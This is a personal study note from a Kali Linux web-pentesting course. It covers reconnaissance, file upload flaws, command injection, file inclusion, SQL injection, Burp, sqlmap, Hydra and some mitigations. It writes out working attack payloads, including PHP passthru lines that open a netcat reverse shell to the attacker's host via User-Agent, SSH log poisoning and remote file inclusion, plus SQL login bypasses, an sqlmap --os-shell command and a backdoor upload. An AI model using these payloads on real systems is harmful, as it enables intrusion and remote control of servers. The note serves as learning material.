---
title: "Kali Learning Note"
date: 2020-08-22 11:57
categories: ['Note', 'Kali']
tags: ['Note', 'Kali', 'Cybersecurity']
---



## Kali Learning Note

> 2020-08-22      11:57:47 The Last Version from YouDao Note
> 2023-08-07      15:46:36 Migrate to here
> VideoCode：BV1Fe411479h

## **What Is A Website**

- Computer with OS and some servers.
- Apache, MySQL .etc
- Contains web application.
- PHP, Python .etc
- Web application is executed here and not on the client's machine

**Note**

The main applications are WebServer and WebDateBase.

Website is just an application installed on a computer..

Domain--DNS--True IP Address.

## **How To Hack A Website?**

- An application installed on a computer.        →web application pentesting
- Computer uses an OS + other applications. → server side attacks.
- Managed by humans.                                   →client side attacks.

Chinese Version

- 安装在计算机上的应用程序。      →Web 应用程序渗透
- 计算机使用 OS + 其他应用程序。 → 服务器端攻击。
- 由人管理。                                  → 客户端攻击。

## **Information Gathering**

- IP Address
- Domain Name Info
- Technologies used
- Other Website In The Same Server
- DNS records
- Unlisted files,sub-domains,directories

**Websites On The Same Server**

- One server can serve a number of websites
- Gaining access to one can help gaining access to others.

**To find websites on the same server:**

1. Use Robtex DNS lookup under "names pointing to same IP".
2. Using bing.com, search for ip: [target ip]

**SubDomains**

- Subdomain.target.com
- Ex: beta.facebook.com

Knock can be used to find subdomains of target

1. Download it > git clone <u>[https://github.com/guelfoweb/knock.git](https://github.com/guelfoweb/knock.git)</u>
2. Navigate to knock.py. > cd knock/knock.py
3. Run it > python knock.py [target]

**Files + Directories**

- Find files & Directories in target website
- A tool called drib

  ```
          usage > drib [Target] [wordlist] [options]

                     >drib [Target]  (Maybe is it right)

          For more info Please Run > man drib
  ```

**Maltego**

- Maltego is an information gathering tool that can be used to collect information about ANYTHING.
- To run maltego type the following in terminal

  ```
           > maltegoce 
  ```

**Note**

- <u>Language</u> :
  - Client Language：The Language About Run On Your Computer.
  - Server Language：The Language About Run On The Server.

The thing(application about hack web)must  be made of the Server Language

**Some Website**

1. Whois Lookup - Find info about the owner of the target.                             →whois.domaintools.com
2. Netcraft Site Report - Shows technologies used on the target.                    →toolbar.netcraft.com/site_ report?url=
3. Robtex DNS lookup - Shows comprehensive info about the target website. →[www.robtex.com](http://www.robtex.com)
4. Bug/WebApplication DateBase. (I Think It Is)

   ```
   →<u>www.exploit-db.com</u>
   ```

## **Exploitation**

**File Upload Vulns****        vnlns:漏洞**

- Simple type of vulnerabilities.         vulnerabilities:漏洞
- Allow users to upload executable files such as php.

Upload a php shell or backdoor, ex: weevly

1. Generate backdoor.                 > weevly generate [passord] [file name]
2. Upload generated file.
3. Connect to it                            > weevly [url to file] [password]
4. Find out how to use weevly     > help

Better Ways : if the web just allow us to upload .jpg

```
                  you can change the .php into .jpg next on upload the .jpg

                  then change the extension name back on burp.

                  But if the web will check the extension or type of the flie this vuln maybe expired-失效 
```

**CODE EXECUTION VULNS **** **

- Allows an attacker to execute OS commands.
- Windows or linux commands.
- Can be used to get a reverse shell.
- Or upload any file using wget command.
- Code execution commands attached in the resources.

IN Linux and Unix You can execute multiple commands on one line using design-based commands.

在 Linux 和 Unix 中您可以使用基于设计的命令在一行上执行多个命令。

So You Can Do That IF the web allow you run some command.

Then it maybe have code execution vulns.

```html
//The following is not code
such as "ping for free"
example:
    input"192.168.0.1"
    then the sever will be run"ping 192.168.0.1"
    input"192.168.0.1;ls"
    then the sever will be run"ping 192.168.0.1"AND"ls"
```

Connect to the taget by command
![](static/X6rzbEDd5onbKExPBCYc8kpZnxb.png)

**LOCAL FILE INCLUSION**

- Allows an attacker read ANY file on the same server.
- Access files outside www directory.

**SHELL FROM LOCAL FILE INCLUSION**

- Try to inject code into readable files.
- Ex: /proc/self/environ

  ```
                /var/log/auth.log      //内含登入信息

                /arl/log/apache2/accss.log
  ```

**Using the /proc/self/environ   **

1. You should try acess the /proc/self/environ
2. If you can access the Local File , The inclusion maybe can be used.
3. Use brup proxy.
4. Input The Code You Want To Run ON The Server Side TO the UserAgent Messagebox.

```html
PHP:
    KALI:
        nc -vv -l -p Port//listen the port."nc" means netcat.
    Burp:
        Change The UserAgent to <?passthru("nc -e /bin/sh KaliIPaddress port");?> 
        Forward then 
    Then Kail will get the shell   
    //KaliAddress NOT Means The local area network IPaddress
```

**Using the /var/log/auth.log**

1. Connect to the target server by ssh.
2. look whether have log message be written in the auth.log
3. If the log message was written in the auth.log

```html
PHP:
    Access The File /var/log/auth.log on browser
    KALI:
        nc -vv -p Port//listen the port
        ssh "<?passthru('nc -e /bin/sh KaliIPaddress port');?>"@SeverIPAddress//通过ssh连接注入代码
        ssh "<?passthru(base64_decode('TheCommandBase64'));?>"@ServerIPAddress//把命令转换成Base64编码，然后再解码运行，有利于命令不被混淆
    Refresh The Web Interface
    Then You Will find your have get the shell.    
   //KaliAddress NOT Means The local area network IPaddress
```

All in all the key point is:

- Find The Log File(日志) And try to write code in the log file.
- Make a way to inject the code.

Example:auth.log stroed the connection messages of ssh so you can make a ssh connect to inject the code into auth.log inside.

**REMOTE FILE INCLUSION****  **

- Similar to local file inclusion.
- But allows an attacker read ANY file from ANY server.
- Execute php files from other servers on the current server.
- Execute php files from other servers on the current server.
- Store php files on other servers as .txt.

```html
Store The Code Want To Be Injected On Kali As .txt file
Such as the .txt contain:
    PHP:
       <?php
       passthru('nc -e /bin/sh KaliIPaddress port');
       ?>
 Stored on your KaliComputer
 For example the path is xxx/xxx.txt            
KALI:
     nc -vv -p Port//listen the port
Browser:
       SEND REQUESTS by url
       such url as :10.20.14.204/dwwa/wudnerabilties/h/?page=http://KaliIPAddress/xxx/xxx.txt?
       //You Need Add ? AT THE END FOR THE CODE RUNNING
       Some Web Have filter for the sending requests
       So you can change the url below as 10.20.14.204/dwwa/wudnerabilties/h/?page=hTTp://KaliIPAddress/xxx/xxx.txt?
       //this means the filter filters http because one url just have one http normally         
KALI:
     Then You will Get the shell
```

**SQL INJECTIONS**

**What SQL?**

- Most websites use a database to store data.
- Most data stored in it (usernames. passwords .etc).
- Web application reads, updates and inserts data in the database.
- Interaction with DB done using SQL. (Interaction:交互）

**WHY ARE THEY SO DANGEROUS**

1. They are everywhere.
2. Give access to the database 一 > sensitive data.
3. Can be used to read local files outside WWW root.
4. Can be used to log in as admin and further exploit the system.
5. Can be used to upload files.

**Discocering SQLi**

- Try to break the page.
- Using 'and', 'order by' or “'” .
- Test text boxes and url parameters on the form

  ```
          http://target.com/page. php?something=something 
  ```

**From POST(log in)**

```html
When You log in some website,it usually will run:
    Select * from accounts where username = '$USERNAME' and password = '$PASSWORD'
    //SQL
The username you input will replace $USERNAME and the password too//it is easy to understand so no example
You can change the code of LINE2 by changing the value of $PASSWORD   
Example:
       Input:
            Username:xxx//Need True Username  
            Password:xxx' and 1=1#//1=1 is true and need true password
      The Code of LINE2 will be:
           Select * from accounts where username = 'xxx' and password = 'xxx' and 1=1 #'
           //the code below is true
      if you can log in it means the code you add(1=1) is running
      if you can not log in usually means not have SQLi
      For futher looking up whether have the SQLi or not
      Then You can input:
           Username:xxx//Need True Username
           Password:xxx' and 1=2#//1=2 is false and need true password
      The Code of LINE2 will be:
           Select * from accounts where username = 'xxx' and password = 'xxx' and 1=2 #'   
           //the code below is false 
      if you can not log in usually means have SQLi
      if you can log in usually means not have SQLi
 If you find it have SQLi,You can run every code you want to run
 Example:
        Input:
              Username:xxx//
              Password:xxx' and THECODEYOUWANTTORUNNING #
        Then The server will run your code
//It is easy to see is right , but this vulns is too low
```

From here we also have a way to log in WITHOUT USERNAME AND PASSWORD

```html
OneWay:
Example:
    Input:
        Username:admin
        Password:xxx' or 1=1 #//xxx is wrong but 1=1 is true so all is right
    The code will be:
        Select * from accounts where username = 'admin' and password = 'xxx' and 1=1 #'  
        //It is easy to see is right , but this vulns is too low
Another Way:
Example:
   Input:
      Username:admin' #
      Password:xxx//Anything
    The code will be:
        Select * from accounts where username = 'admin' # and password = 'xxx' 
        //This means the code after # are all comments(注释；也就是不会运行的)  
        //It is easy to see is right , but this vulns is low too
```

Also , if The Username Or Password have filter We can use Burp to change The value of username and password

**From GET(Search)**

```cpp
Such url as:index.php?page=user-info.php&username=zaid&password=123456&user-info-php-submit-button=View+Account+Details
This means maybe have SQLi 
You can try this url:index.php?page=user-info.php&username=zaid' order by 1#&password=123456&user-info-php-submit-button=View+Account+Details
//order by 1 :排列第一行的数据 
//The code after # can not be run , so the password can be anything
You can try this url:index.php?page=user-info.php&username=zaid' union selcet 1,2,3,4,5 #&password=123456&user-info-php-submit-button=View+Account+Details
Then you will get some info such as username=2 password=3 
then you can change 2 to datebase() change 3 to user() 
index.php?page=user-info.php&username=zaid' union selcet 1,datebase(),user(),4,5 #&password=123456&user-info-php-submit-button=View+Account+Details
We can get the name of datebase which stored use-info from Usename
//Because the example url will show a user-info SO YOU CAN GET THE NAME OF DATEBASE WHICH STORED [USER-INFO]
We can get the user of datebase which stored use-info from Password
//User means The Datebase owner
//吐槽一句，Sqlmap能找到这些SQLi吗，能的话就不用一个一个搞了qwq
```

**Note**

- Datebase Table Schema/Name Can Expresse In Hexadecimal(十六进制)

  ```
          Which will help you to bypass(绕过) some filters.

          *When you express it in Hexadecimal you need not input   ' ' JUST INPUT 0X12345678
  ```

**SQLMAP**

- Tool designed to exploit sql injections.
- Works with many db types, mysql, mssql ...etc.
- Can be used to perform everything we learned and more!

  ```
   usage > sqlmap -u [url] (or ["url"])
  ```

```html
sqlmap -u [url] --os-shell //Get Shell By sqlmap
sqlmap -u [url] --sql-shell //Get SQLShell By sqlmap,You can run any SQL statement in SQLShell
```

**XSS VULNS**

**SCANNING TOOLS**

**ZED ATTACK PROXY(ZAP)**

- Automatically find vulnerabilities in web applications.
- Free and easy to use.
- Can also be used for manual testing.

## **INTERCEPTING REQUESTS**

**BASIC INFORMATION FLOW**

- User clicks on a link.
- HTML website generates a request (client side)
- Request is sent to the server.
- Server performs the request (Server Side)
- Sends response back.
  ![](static/SkHkbRxgZoEJXHxxBP5c2ZbGnX4.png)

**Burp Proxy**

We can intercepting requests by proxy

The principle:

1. Open Burp
2. You need to set the proxy of your browser
   Attention: Any request requires your consent(同意,means click forward)

![](static/WlPcb0okCo8riBx0EFwcBpbmn8f.png)

Remember to set back the proxy settings !

So now you need to know a way: if the web just allow us to upload .jpg , you can change the .php into .jpg next on upload the .jpg then change the extension name back on burp.

## **Mitigation(Safety)      **

> **mitigation:缓和，减轻，镇静**

**File Upload Vulns**

1. Never allow users to upload executables (php, exe ..etc)
2. Check the file type AND the file extension.
3. Analyse the uploaded file itself, recreate it and rename it.

**CODE EXECUTION VULNS**

1. Don't use dangerous functions.
2. Filter use input before execution.

**FILE INCLUSION VULNS**

1. Prevent remove file inclusion.               > Disable allow_ _url_ _fopen & allow_ url_ include.
2. Prevent local file inclusion.                    > Use static file inclusion.

```html
url:index.php?page=news.php
//do less like that it will decrase your code length but less security
code:
include($ GET['page']:)
```

**SQLi**

**Log in (From POST)**

```html
Low security:
    "Select * from accounts WHERE username = '$USERNAME' and password = '$PASSWORD'"
Medium security:
    "Select * from accounts WHERE username = '"
             $conn -> real_escape_string($USERNAME).
             //The function of real_escape_string is delete ' or # or / and so on
             "'AND password='".
             $conn -> real_escape_string($PASSWORD).
             "'";
             //The function of real_escape_string is delete ' or # or / and so on
```

**Preventing SQLi**

- Filters can be bypassed.
- Use black list of commands? Still can be bypassed
- Use whitelist? Same issue

  ```
   -->   Use parameterized statements, separate data from sql code.
  ```

```php
<?php
//$textbox1 = admin' union select #
Select * from accounts wherer username= "$textbox1"
Safe:
->prepare("Select * from accounts wherer username = ?"')
->execute(array('$textbox1'))
?>
```

## **BRUTE FORCE & DICTIONARY ATTACKS**

1. BRUTE FORCE ATTACKS                       >Cover all possible combinations.
2. DICTIONARY ATTACKS                           >Use a wordlist, try every password in the list only .

**CREATING A WORDLIST**

- Crunch can be used to create a wordlist.
- Syntax: >crunch [min] [max] [characters] -t [pattern] -o [FileName]
- Example:crunch 6 8 123abc$ -i wordlist -t a@@@@b

```bash
//创建一个6~8个字符包括123adb$且a开头b结尾的名为Wordlist的字典
Generated passes:aaaaab      aabbbb      aac$$b
```

**HYDRA**

```bash
Syntax:
      hydra [IPAddress] -l [Username Or ThePathOfTheUsernameDictionary] -P [Password Or ThePathOfThePasswordDictionary] http-post-from "[url]:parameter=^USER^$parameter=^PASS^(ALL POST NEED INPUT HERE):F=NOT LOG IN"
      //上述是指HTTP POST登录 parameter：参数 当页面返回NOT LOG IN 表示登录失败用F表示 All POST CAN BE FINDED BY BURP/BrowserDeveloperTools(F12)
      //Before Using hydra to do dictionary attacks You mayebe need to look whether the sever was be SUPPORTED BY HYDRA
      //more details please run hydra -help
```

## **Appendix**

**URL Encoding Table**
